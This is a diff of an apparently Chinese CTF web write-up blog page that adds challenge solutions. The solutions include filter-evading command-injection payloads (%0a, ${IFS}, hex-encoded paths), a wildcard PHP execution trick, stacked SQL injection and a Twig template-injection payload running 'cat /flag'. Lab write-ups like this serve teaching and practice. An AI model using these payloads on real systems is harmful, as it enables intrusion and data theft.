@@ -876,14 +876,14 @@ Hint: If you got 「HTTP Method Not">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        12.6k
+                        12.8k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        54 分
+                        55 分
                     </div>
                     
                 
@@ -1234,7 +1234,7 @@ i don't have shell<span class="token punctuation">,</span> how to get flag<span 
 phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p>
 <p>搜索了一下发现这是属于php伪协议的一种类型：</p>
-<p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>php://input 是个可以访问请求的数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
 <p>利用条件：</p>
 <ol>
 <li>allow_url_include = On。</li>
@@ -1357,6 +1357,8 @@ phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <p>构造:</p>
 <p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p>
 <p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p>
+<p>方法二：</p>
+<p>%0acd%09f%27l%27ag_is_here%0atac%09fl%27a%27g_91124222386.php</p>
 <h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="扫盲："><a href="#扫盲：" class="headerlink" title="扫盲："></a>扫盲：</h3><h4 id="csrf初探："><a href="#csrf初探：" class="headerlink" title="csrf初探："></a>csrf初探：</h4><p><a href="https://www.cnblogs.com/jinjiangongzuoshi/p/7441715.html" target="_blank" rel="noopener">详细解说</a></p>
 <p>自我理解：客户在带有网站a的cookie信息后，收到b站的恶意攻击代码，然后在客户机不知情的情况下，去a站执行了b站的要求，比如a站为qq邮箱，那么b站要求访问b站的客户在a站发送大量广告邮箱给你的邮箱好友列表，因为b站没有你在a站的cookie验证信息，所以不能直接利用客户机的cookie去执行，这就需要客户机主动请求这个恶意网站b，然后b站给你下达命令让你的客户机去执行发广告的这一个操作，这样a站会以为是客户需要进行这样的一个服务，所以就会乖乖的执行</p>
 <h5 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h5><p>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</p>
@@ -2070,22 +2072,23 @@ echo urlencode(~&#39;flag.php&#39;); //%99%93%9E%98%D1%8F%97%8F
 <h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>1.利用.来执行脚本</p>
 <p>2.利用linux的通配符来实现匹配文件的名字</p>
 <h3 id="解题：-8"><a href="#解题：-8" class="headerlink" title="解题："></a>解题：</h3><p>构造post文件上传的数据包用来上传文件：将以下代码在本地构造，然后浏览器运行再抓包</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;title&gt;POST数据包POC&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-&lt;!--链接是当前打开的题目链接--&gt;
-    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>写脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!--链接是当前打开的题目链接--></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>写脚本：</p>
 <pre><code>#!/bin/sh
 cat /flag</code></pre><p>构造poc：</p>
 <pre><code>?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;</code></pre><h2 id="2018-HCTF-Web-warmup"><a href="#2018-HCTF-Web-warmup" class="headerlink" title="2018-HCTF-Web-warmup"></a>2018-HCTF-Web-warmup</h2><p>访问source.php</p>
@@ -2147,7 +2150,17 @@ cat /flag</code></pre><p>构造poc：</p>
 <h2 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h2><p>给了一大堆php后门文件，要用脚本去跑可以用的文件</p>
 <p>木马：xk0SzyKwfzw.php?Efa5BVG=cat /flag</p>
 <p>Efa5BVG</p>
-
+<h2 id="SUCTF-2019-Web-easysql"><a href="#SUCTF-2019-Web-easysql" class="headerlink" title="SUCTF-2019-Web-easysql"></a>SUCTF-2019-Web-easysql</h2><h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><p>利用mysql的内置变量将||的性质改变为字符串的连接符，而非或运算符</p>
+<p>堆叠注入</p>
+<h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><p>源码：</p>
+<pre><code>select $_GET[&#39;query&#39;] || flag from flag</code></pre><p>解法一：</p>
+<pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>相当于：select 1,flag from Flag</p>
+<p>解法二：</p>
+<pre><code>*,1</code></pre><p>相当于select *,1||flag from Flag 取得全部数据</p>
+<h2 id="BJDCTF-2020-web-cookie-is-so-subtle-尚未解决"><a href="#BJDCTF-2020-web-cookie-is-so-subtle-尚未解决" class="headerlink" title="BJDCTF-2020-web-cookie is so subtle!(尚未解决)"></a>BJDCTF-2020-web-cookie is so subtle!(尚未解决)</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>利用这个方法来判断模板注入的哪个模板，然后返回值为49所以是Twig，如果是7777777则是Jinja2</p>
+<p>然后搜索一下twig的模板注入</p>
+<pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>
             </div>
             <hr/>
 
@@ -2877,7 +2890,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">79.2k</span> 字
+                <span class="white-color">79.7k</span> 字
             
 
             
